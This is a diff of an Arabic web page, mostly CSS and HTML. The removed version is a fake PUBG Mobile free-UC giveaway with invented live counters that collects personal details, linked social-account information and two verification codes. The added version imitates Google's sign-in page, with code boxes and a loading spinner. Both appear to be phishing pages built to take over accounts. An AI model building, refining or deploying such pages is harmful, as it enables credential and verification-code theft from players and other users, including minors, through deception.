@@ -1,2409 +1,790 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مسابقات ببجي موبايل الأسبوعية | PUBG Mobile Weekly Tournaments</title>
-    <!-- خط القاهرة العربي الاحترافي -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
-    <!-- مكتبة الأيقونات FontAwesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول - Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-charcoal: #14171d;
-            --header-dark: #1e2229;
-            --card-ivory: rgba(253, 251, 247, 0.95);
-            --gold-bright: #ffb703;
-            --gold-hover: #e09f00;
-            --neon-blue: #00f3ff;
-            --danger-red: #e63946;
-            --success-green: #2a9d8f;
-            --text-dark: #2b2d42;
-            --border-dark: #3a3f4d;
-            --input-bg: #f0f2f5;
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --subtext-color: #5f6368;
+            --border-color: #dadce0;
+            --primary-blue: #1a73e8;
+            --primary-hover: #1557b0;
+            --card-bg: #ffffff;
+            --input-bg: #ffffff;
+            --box-bg: #f1f3f4;
+            --error-color: #d93025;
+            --success-color: #1e8e3e;
+        }
+
+        /* الاستجابة التلقائية للوضع الداكن (Dark Mode) */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --text-color: #e8eaed;
+                --subtext-color: #9aa0a6;
+                --border-color: #5f6368;
+                --primary-blue: #8ab4f8;
+                --primary-hover: #aecbfa;
+                --card-bg: #2d2e30;
+                --input-bg: #202124;
+                --box-bg: #3c4043;
+                --error-color: #f28b82;
+                --success-color: #81c995;
+            }
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Cairo', sans-serif;
-            user-select: none;
+            font-family: 'Cairo', 'Roboto', sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
-        body {
-            background-color: var(--bg-charcoal);
-            background-image: 
-                radial-gradient(circle at 50% 10%, rgba(0, 243, 255, 0.08), transparent 40%),
-                radial-gradient(circle at 80% 80%, rgba(255, 183, 3, 0.05), transparent 50%);
-            color: var(--text-dark);
-            min-height: 100vh;
+        body, html {
+            width: 100vw;
+            height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             overflow-x: hidden;
-            position: relative;
         }
 
-        /* خلفية التفاعلات الجسيمية Particle VFX Canvas */
-        #particleCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .container {
             width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        /* الشريط المتحرك العلوي للتنبيه */
-        .marquee-banner {
-            background: linear-gradient(90deg, #b7094c, #7209b7, #b7094c);
-            color: #fff;
-            padding: 6px 0;
-            font-size: 0.85rem;
-            font-weight: 700;
-            overflow: hidden;
-            position: relative;
-            z-index: 1001;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        .marquee-text {
-            display: inline-block;
-            white-space: nowrap;
-            animation: marquee 22s linear infinite;
-        }
-        @keyframes marquee {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        /* الشريط العلوي الثابت Sticky Header */
-        header {
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            background: rgba(30, 34, 41, 0.95);
-            backdrop-filter: blur(12px);
-            border-bottom: 2px solid rgba(255, 183, 3, 0.3);
-            padding: 10px 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-        }
-        .header-container {
-            max-width: 900px;
-            margin: 0 auto;
+            max-width: 450px;
+            min-height: 520px;
+            padding: 24px 36px 40px 36px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
             display: flex;
+            flex-direction: column;
             justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
+            position: relative;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-        .header-title {
-            color: var(--gold-bright);
-            font-size: 1.1rem;
-            font-weight: 900;
+
+        @media (max-width: 600px) {
+            .container {
+                width: 100vw;
+                height: 100vh;
+                min-height: 100vh;
+                border: none;
+                border-radius: 0;
+                box-shadow: none;
+                justify-content: flex-start;
+                padding: 20px 20px;
+            }
+        }
+
+        /* شريط العودة بأعلى الشاشة */
+        .top-nav {
             display: flex;
             align-items: center;
-            gap: 8px;
-            text-shadow: 0 0 10px rgba(255, 183, 3, 0.3);
+            justify-content: flex-start;
+            min-height: 32px;
+            margin-bottom: 8px;
         }
-        .support-btn-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .support-label {
-            color: #fff;
-            font-size: 0.8rem;
-            font-weight: 700;
-        }
-        .btn-social {
-            padding: 6px 12px;
-            border-radius: 8px;
-            color: #fff;
-            text-decoration: none;
-            font-size: 0.85rem;
-            font-weight: 700;
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--primary-blue);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            transition: transform 0.2s, filter 0.2s;
-            cursor: pointer;
-            border: none;
-        }
-        .btn-social:hover { transform: translateY(-2px); filter: brightness(1.1); }
-        .btn-telegram { background: #0088cc; }
-        .btn-whatsapp { background: #25d366; }
-
-        /* العدادات اللحظية وشريط الوقت */
-        .live-stats-bar {
-            background: rgba(20, 23, 29, 0.9);
-            border-bottom: 1px solid var(--border-dark);
-            padding: 8px 16px;
-            color: #fff;
-            font-size: 0.8rem;
-            position: relative;
-            z-index: 999;
-        }
-        .stats-flex {
-            max-width: 900px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .stat-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-weight: 700;
-        }
-        .stat-item span.number {
-            color: var(--gold-bright);
-            font-family: monospace;
-            font-size: 1rem;
-        }
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background: #2ec4b6;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #2ec4b6;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.2); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.7; }
+            padding: 6px 10px;
+            border-radius: 6px;
+            transition: background-color 0.2s;
         }
 
-        /* شريط التبويبات والمراحل الست Stepper Tabs */
-        .stepper-nav {
-            max-width: 900px;
-            margin: 15px auto 5px;
-            padding: 0 12px;
-            display: flex;
-            justify-content: space-between;
-            position: relative;
-            z-index: 10;
-        }
-        .step-tab {
-            flex: 1;
-            text-align: center;
-            padding: 8px 4px;
-            background: rgba(30, 34, 41, 0.8);
-            color: #a0aab8;
-            font-size: 0.75rem;
-            font-weight: 700;
-            border-bottom: 3px solid transparent;
-            cursor: pointer;
-            transition: all 0.3s;
-            border-radius: 6px 6px 0 0;
-            margin: 0 2px;
-        }
-        .step-tab.active {
-            color: #fff;
-            background: rgba(45, 52, 64, 0.9);
-            border-bottom: 3px solid var(--neon-blue);
-            box-shadow: 0 0 12px rgba(0, 243, 255, 0.4);
-        }
-        .step-tab.completed { color: var(--gold-bright); }
-
-        /* شريط التقدم Progress Bar */
-        .progress-container {
-            max-width: 900px;
-            margin: 0 auto 20px;
-            height: 6px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 3px;
-            overflow: hidden;
-            position: relative;
-            z-index: 10;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            width: 16.66%;
-            background: linear-gradient(90deg, var(--gold-bright), var(--neon-blue));
-            transition: width 0.4s ease;
-            box-shadow: 0 0 10px var(--neon-blue);
+        .back-btn:hover {
+            background-color: var(--box-bg);
         }
 
-        /* الحاوية الرئيسية للبطاقات Card Container */
-        .main-wrapper {
-            max-width: 750px;
-            margin: 0 auto 40px;
-            padding: 0 12px;
-            position: relative;
-            z-index: 10;
-        }
-
-        /* البطاقة الزجاجية العاجية Glassmorphism Card */
-        .glass-card {
-            background: var(--card-ivory);
-            backdrop-filter: blur(16px);
-            border: 2px solid rgba(255, 183, 3, 0.4);
-            border-radius: 20px;
-            padding: 28px 22px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 0 15px rgba(255,255,255,0.6);
-            display: none;
-            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-            position: relative;
-        }
-        .glass-card.active { display: block; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px) scale(0.98); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        .card-header-title {
-            color: var(--bg-charcoal);
-            font-size: 1.4rem;
-            font-weight: 900;
+        .google-logo {
             text-align: center;
             margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px dashed rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
         }
 
-        /* عناصر إدخال البيانات Inputs & Forms */
-        .form-group {
-            margin-bottom: 18px;
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--subtext-color);
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .input-group {
             position: relative;
-        }
-        .form-label {
-            display: block;
-            font-weight: 800;
-            font-size: 0.9rem;
-            color: #1a1c23;
-            margin-bottom: 6px;
-        }
-        .form-input {
+            margin-bottom: 16px;
             width: 100%;
-            padding: 12px 16px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--border-dark);
-            border-radius: 10px;
-            font-size: 0.95rem;
-            color: #111;
-            font-weight: 600;
-            outline: none;
-            transition: all 0.25s;
-        }
-        .form-input:focus {
-            border-color: var(--gold-bright);
-            box-shadow: 0 0 8px rgba(255, 183, 3, 0.5);
-            background: #fff;
-        }
-        .input-status-icon {
-            position: absolute;
-            left: 12px;
-            top: 40px;
-            font-size: 1.1rem;
-            display: none;
-        }
-        .input-status-icon.valid { display: block; color: var(--success-green); }
-        .input-status-icon.invalid { display: block; color: var(--danger-red); }
-
-        .hint-text {
-            font-size: 0.78rem;
-            color: #555;
-            margin-top: 4px;
-            font-weight: 600;
         }
 
-        /* الأزرار العامة Buttons */
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 25px;
-            flex-wrap: wrap;
-        }
-        .btn-primary {
-            flex: 2;
-            min-width: 160px;
-            background: linear-gradient(135deg, var(--gold-bright), #f39c12);
-            color: var(--bg-charcoal);
-            border: none;
-            padding: 14px 20px;
-            border-radius: 12px;
-            font-size: 1.05rem;
-            font-weight: 900;
-            cursor: pointer;
-            box-shadow: 0 6px 20px rgba(255, 183, 3, 0.4);
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(255, 183, 3, 0.6);
-        }
-        .btn-primary:disabled {
-            background: #ccc;
-            box-shadow: none;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .btn-secondary {
-            flex: 1;
-            min-width: 100px;
-            background: #343a40;
-            color: #fff;
-            border: none;
+        .input-field {
+            width: 100%;
             padding: 14px 16px;
-            border-radius: 12px;
-            font-size: 0.95rem;
-            font-weight: 800;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
+            font-size: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            outline: none;
+            transition: border-color 0.2s;
         }
-        .btn-secondary:hover { background: #212529; }
-        
-        .btn-skip {
-            background: #6c757d;
-            color: #fff;
-            padding: 8px 14px;
-            border-radius: 8px;
-            font-size: 0.8rem;
-            font-weight: 700;
+
+        .input-field:focus {
+            border-color: var(--primary-blue);
+            border-width: 2px;
+            padding: 13px 15px;
+        }
+
+        .input-field:disabled {
+            background-color: var(--box-bg);
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn-link {
+            background: none;
             border: none;
+            color: var(--primary-blue);
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 6px;
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        /* عرض الجوائز Interactive Reward Cards */
-        .rewards-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
-            gap: 12px;
-            margin: 20px 0;
-        }
-        .reward-card {
-            background: rgba(255,255,255,0.8);
-            border: 2px solid #e2e8f0;
-            border-radius: 14px;
-            padding: 12px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
-        }
-        .reward-card:hover, .reward-card.selected {
-            border-color: var(--gold-bright);
-            transform: translateY(-4px) scale(1.03);
-            box-shadow: 0 8px 20px rgba(255, 183, 3, 0.3);
-            background: #fff;
-        }
-        .reward-icon {
-            font-size: 2.2rem;
-            color: var(--gold-bright);
-            margin-bottom: 6px;
-        }
-        .reward-title { font-weight: 900; font-size: 1rem; color: #111; }
-
-        /* منصات الحسابات Platform Selection Grid */
-        .platforms-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
-            gap: 10px;
-            margin: 15px 0;
-        }
-        .platform-box {
-            background: rgba(240, 242, 245, 0.9);
-            border: 2px solid #d1d5db;
-            border-radius: 12px;
-            padding: 12px 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.25s;
-        }
-        .platform-box:hover, .platform-box.active {
-            border-color: #2563eb;
-            background: #fff;
-            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.25);
-            transform: translateY(-2px);
-        }
-        .platform-box i { font-size: 1.8rem; margin-bottom: 4px; display: block; }
-        .platform-box.fb i { color: #1877f2; }
-        .platform-box.tw i { color: #000; }
-        .platform-box.gg i { color: #ea4335; }
-        .platform-box.em i { color: #d97706; }
-        .platform-box.ph i { color: #10b981; }
-        .platform-name { font-size: 0.8rem; font-weight: 800; color: #333; }
-
-        /* روابط التوجيه المباشر Deep-Link Buttons */
-        .deep-link-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #2563eb;
-            color: #fff;
             text-decoration: none;
-            padding: 8px 14px;
-            border-radius: 8px;
-            font-size: 0.82rem;
-            font-weight: 700;
-            margin-top: 8px;
-            transition: background 0.2s;
+            display: inline-block;
+            margin-top: 6px;
         }
-        .deep-link-btn:hover { background: #1d4ed8; }
 
-        /* شاشة الأسئلة Trivia Box */
-        .trivia-card {
-            background: #fff;
-            border-radius: 16px;
-            padding: 20px;
-            border: 2px solid #e5e7eb;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+        .btn-link:hover {
+            text-decoration: underline;
         }
-        .timer-header {
+
+        .btn-primary {
+            background-color: var(--primary-blue);
+            color: #ffffff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .btn-primary {
+                color: #202124;
+            }
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .actions {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #eee;
+            margin-top: 30px;
         }
-        .timer-badge {
-            background: #fee2e2;
-            color: #991b1b;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-weight: 900;
-            font-size: 0.9rem;
+
+        .fixed-box {
+            background-color: var(--box-bg);
+            border: 1px dashed var(--border-color);
+            padding: 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 16px;
+            text-align: center;
+            margin: 12px 0;
+            user-select: all;
+            word-break: break-all;
+        }
+
+        .spinner-container {
             display: flex;
+            flex-direction: column;
             align-items: center;
-            gap: 6px;
+            justify-content: center;
+            padding: 60px 0;
         }
-        .question-text {
-            font-size: 1.15rem;
-            font-weight: 800;
-            color: #111827;
-            margin-bottom: 18px;
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid var(--border-color);
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .alert-info {
+            background-color: var(--box-bg);
+            border-right: 4px solid var(--primary-blue);
+            padding: 12px 16px;
+            font-size: 13px;
+            border-radius: 4px;
+            margin-bottom: 16px;
             line-height: 1.5;
         }
-        .options-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .option-btn {
-            background: #f9fafb;
-            border: 2px solid #e5e7eb;
-            padding: 12px 16px;
-            border-radius: 10px;
-            text-align: right;
-            font-weight: 700;
-            font-size: 0.95rem;
-            color: #374151;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .option-btn:hover { background: #f3f4f6; border-color: #d1d5db; }
-        .option-btn.correct {
-            background: #d1fae5 !important;
-            border-color: #10b981 !important;
-            color: #065f46 !important;
-        }
-        .option-btn.wrong {
-            background: #fee2e2 !important;
-            border-color: #ef4444 !important;
-            color: #991b1b !important;
-            animation: shake 0.4s ease-in-out;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-8px); }
-            40%, 80% { transform: translateX(8px); }
+
+        .alert-danger {
+            background-color: rgba(217, 48, 37, 0.15);
+            color: var(--error-color);
+            padding: 12px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            margin-bottom: 14px;
+            text-align: center;
+            font-weight: 600;
         }
 
-        /* نافذة الدعم العائمة Quick Support Floating Desk */
-        .floating-support-desk {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 9999;
+        .smart-btns {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
         }
-        .support-fab {
-            width: 58px;
-            height: 58px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--gold-bright), #f39c12);
-            color: var(--bg-charcoal);
+
+        .smart-btn {
+            flex: 1;
+            min-width: 100px;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background: var(--card-bg);
+            color: var(--text-color);
+            text-align: center;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.6rem;
-            box-shadow: 0 8px 25px rgba(255, 183, 3, 0.5);
+            gap: 6px;
             cursor: pointer;
-            transition: transform 0.3s;
         }
-        .support-fab:hover { transform: scale(1.1) rotate(10deg); }
-        .support-modal {
-            position: absolute;
-            bottom: 70px;
-            right: 0;
-            width: 320px;
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
-            border: 2px solid var(--gold-bright);
-            padding: 16px;
+
+        .step-page {
             display: none;
-            animation: slideUp 0.3s ease;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .support-modal.active { display: block; }
-
-        /* الإشعارات الحية التفاعلية Toasts */
-        .toast-container {
-            position: fixed;
-            bottom: 85px;
-            left: 20px;
-            z-index: 9998;
-            display: flex;
             flex-direction: column;
-            gap: 10px;
-            max-width: 340px;
-            pointer-events: none;
-        }
-        .toast-card {
-            background: rgba(30, 34, 41, 0.95);
-            color: #fff;
-            border-right: 4px solid var(--gold-bright);
-            padding: 10px 14px;
-            border-radius: 10px;
-            font-size: 0.8rem;
-            font-weight: 700;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-            backdrop-filter: blur(8px);
-            animation: toastIn 0.4s cubic-bezier(0.16, 1, 0.3, 1), toastOut 0.4s 4.5s forwards;
-        }
-        @keyframes toastIn { from { opacity: 0; transform: translateX(-30px); } to { opacity: 1; transform: translateX(0); } }
-        @keyframes toastOut { from { opacity: 1; transform: translateX(0); } to { opacity: 0; transform: translateX(-30px); } }
-
-        /* شاشة انقطاع الإنترنت Offline Shield */
-        #offlineOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
             height: 100%;
-            background: rgba(15, 17, 21, 0.97);
-            backdrop-filter: blur(20px);
-            z-index: 999999;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            text-align: center;
-            padding: 20px;
         }
-        #offlineOverlay.active { display: flex; }
-        .offline-icon { font-size: 4rem; color: var(--danger-red); margin-bottom: 15px; animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        /* مربعات الاختيار التفاعلية والمعطلة */
-        .checkbox-container {
+        .step-page.active {
+            display: flex;
+        }
+
+        .success-icon {
+            width: 72px;
+            height: 72px;
+            background-color: var(--success-color);
+            color: #fff;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin: 12px 0;
-            font-size: 0.88rem;
-            font-weight: 700;
+            justify-content: center;
+            font-size: 36px;
+            margin: 0 auto 20px auto;
         }
-        .checkbox-container input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: var(--gold-bright);
-        }
-        .checkbox-container.disabled-box {
-            pointer-events: none;
-            opacity: 0.7;
-        }
-
-        /* تأثيرات الاحتفال بالفوز */
-        .celebration-box {
-            text-align: center;
-            padding: 20px;
-        }
-        .trophy-glow {
-            font-size: 4.5rem;
-            color: var(--gold-bright);
-            filter: drop-shadow(0 0 20px var(--gold-bright));
-            animation: bounce 2s infinite;
-        }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-12px); } }
     </style>
 </head>
 <body>
 
-    <!-- canvas المؤثرات الضوئية التفاعلية -->
-    <canvas id="particleCanvas"></canvas>
-
-    <!-- الشريط المتحرك العلوي للتنبيه -->
-    <div class="marquee-banner">
-        <div class="marquee-text">
-            🔥 تنبيه هام: إذا واجهت أي صعوبة أثناء التسجيل أو أردت المساعدة الفورية، تواصل معنا مباشرة مع فريق الدعم عبر الأزرار بالأعلى! نتمنى لك التوفيق في السحب الأسبوعي! 🏆
-        </div>
-    </div>
-
-    <!-- الشريط العلوي الثابت Sticky Header -->
-    <header>
-        <div class="header-container">
-            <div class="header-title">
-                <i class="fa-solid font-trophy fa-trophy"></i>
-                <span>مسابقات ببجي موبايل الأسبوعية</span>
-            </div>
-            <div class="support-btn-group">
-                <span class="support-label">فريق الدعم تواصل معنا 👈:</span>
-                <button class="btn-social btn-telegram" onclick="openTelegramDirect()">
-                    <i class="fa-brands fa-telegram"></i> تليجرام
-                </button>
-                <button class="btn-social btn-whatsapp" onclick="openWhatsAppDirect()">
-                    <i class="fa-brands fa-whatsapp"></i> واتساب
-                </button>
-            </div>
-        </div>
-    </header>
-
-    <!-- العدادات اللحظية وشريط وقت السحب -->
-    <div class="live-stats-bar">
-        <div class="stats-flex">
-            <div class="stat-item">
-                <div class="pulse-dot"></div>
-                <span>المتواجدون الآن:</span>
-                <span class="number" id="liveVisitorsCount">482</span>
-            </div>
-            <div class="stat-item">
-                <i class="fa-solid fa-users-check" style="color:var(--neon-blue)"></i>
-                <span>المسجلون اليوم:</span>
-                <span class="number" id="registeredCount">319</span>
-            </div>
-            <div class="stat-item">
-                <i class="fa-solid fa-clock" style="color:var(--gold-bright)"></i>
-                <span>ينتهي السحب الأسبوعي بعد:</span>
-                <span class="number" id="countdownTimer">00:00:00</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- شريط المراقع والخطوات الست Stepper Nav -->
-    <div class="stepper-nav" id="stepperNav">
-        <div class="step-tab active" data-step="1">1. المقدمة</div>
-        <div class="step-tab" data-step="2">2. البيانات</div>
-        <div class="step-tab" data-step="3">3. الحساب</div>
-        <div class="step-tab" data-step="4">4. الأسئلة</div>
-        <div class="step-tab" data-step="5">5. الكود الأول</div>
-        <div class="step-tab" data-step="6">6. التأكيد الثاني</div>
-    </div>
-
-    <div class="progress-container">
-        <div class="progress-bar-fill" id="progressBarFill"></div>
-    </div>
-
-    <!-- الحاوية الرئيسية للبطاقات Card Manager -->
-    <main class="main-wrapper">
-
-        <!-- 🟢 الخطوة 1: المقدمة ونظام المشاركة -->
-        <div class="glass-card active" id="cardStep1">
-            <div class="card-header-title">
-                <i class="fa-solid fa-gamepad" style="color:var(--gold-bright)"></i>
-                <span>أهلاً بك في مسابقة معلومات ببجي موبايل!</span>
-            </div>
-            <p style="text-align: center; color: #333; font-weight: 700; line-height: 1.7; margin-bottom: 20px;">
-                هل تمتلك الخبرة الكافية في أسرار اللعبة والخرائط والأسلحة؟ اختبر معلوماتك الآن واحصل على فرصة للدخول في السحب الأسبوعي لثلاثة فائزين بشدات ببجي مجاناً!
-            </p>
-
-            <h4 style="color:#111; font-weight:800; margin-bottom:10px;"><i class="fa-solid fa-gift"></i> اختر الجائزة التي ترغب بدخول السحب عليها:</h4>
-            <div class="rewards-grid">
-                <div class="reward-card selected" onclick="selectReward(this, '300 UC')">
-                    <div class="reward-icon"><i class="fa-solid fa-gem"></i></div>
-                    <div class="reward-title">300 UC</div>
-                    <div style="font-size:0.75rem; color:#666;">شدات مباشرة</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, '400 UC')">
-                    <div class="reward-icon"><i class="fa-solid fa-coins"></i></div>
-                    <div class="reward-title">400 UC</div>
-                    <div style="font-size:0.75rem; color:#666;">شدات + صندوق</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, '500 UC')">
-                    <div class="reward-icon"><i class="fa-solid fa-crown"></i></div>
-                    <div class="reward-title">500 UC</div>
-                    <div style="font-size:0.75rem; color:#666;">شدات التصريح الممتاز</div>
-                </div>
-            </div>
-
-            <div style="background:rgba(255, 183, 3, 0.15); border-right:4px solid var(--gold-bright); padding:12px; border-radius:8px; margin-bottom:20px; font-size:0.85rem; color:#222; font-weight:700;">
-                <i class="fa-solid fa-circle-info"></i> <strong>طريقة المشاركة:</strong> إجابة 3 أسئلة عشوائية بنجاح، إدخال بيانات الوصول بشكل صحيح لضمان تسليم الجائزة، وتأكيد كود التحقق.
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-primary" onclick="goToStep(2)">
-                    <span>بدأ التسجيل الآن</span>
-                    <i class="fa-solid fa-arrow-left"></i>
-                </button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 2: البيانات الشخصية -->
-        <div class="glass-card" id="cardStep2">
-            <div class="card-header-title">
-                <i class="fa-solid fa-id-card"></i>
-                <span>البيانات الشخصية</span>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">الاسم الثلاثي:</label>
-                <input type="text" id="inputFullName" class="form-input" autocomplete="name" placeholder="أدخل اسمك الثلاثي" oninput="validatePersonalStep()">
-                <i class="fa-solid fa-circle-check input-status-icon" id="iconName"></i>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">رقم الهاتف:</label>
-                <input type="tel" id="inputPhone" class="form-input" autocomplete="tel" placeholder="مثال: 771234567" oninput="validatePersonalStep()">
-                <i class="fa-solid fa-circle-check input-status-icon" id="iconPhone"></i>
-                <div class="hint-text">يرجى كتابة رقم هاتف يعمل للتمكن من التواصل عند الفوز.</div>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">العمر:</label>
-                <input type="number" id="inputAge" class="form-input" placeholder="مثال: 22" min="12" max="90" oninput="validatePersonalStep()">
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">الأيدي (Player ID):</label>
-                <input type="text" id="inputPlayerID" class="form-input" autocomplete="username" placeholder="أدخل الأيدي بالأرقام فقط مثل: 5123456789" oninput="validatePersonalStep()">
-                <i class="fa-solid fa-circle-check input-status-icon" id="iconPlayerID"></i>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">العنوان / المدينة:</label>
-                <input type="text" id="inputAddress" class="form-input" placeholder="مثال: اليمن، صنعاء" oninput="validatePersonalStep()">
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="goToStep(1)">العودة</button>
-                <button class="btn-primary" id="btnNextStep2" disabled onclick="submitStep2AndNext()">
-                    <span>متابعة لمعلومات الحساب</span>
-                    <i class="fa-solid fa-arrow-left"></i>
-                </button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 3: معلومات الحساب والمنصة -->
-        <div class="glass-card" id="cardStep3">
-            <div class="card-header-title">
-                <i class="fa-solid fa-shield-halved"></i>
-                <span>ربط معلومات المنصة والحساب</span>
-            </div>
-
-            <label class="form-label">اختر المنصة المرتبطة بحساب ببجي موبايل:</label>
-            <div class="platforms-grid">
-                <div class="platform-box fb active" onclick="selectPlatform('facebook', this)">
-                    <i class="fa-brands fa-facebook"></i>
-                    <div class="platform-name">فيسبوك</div>
-                </div>
-                <div class="platform-box tw" onclick="selectPlatform('twitter', this)">
-                    <i class="fa-brands fa-x-twitter"></i>
-                    <div class="platform-name">تويتر / X</div>
-                </div>
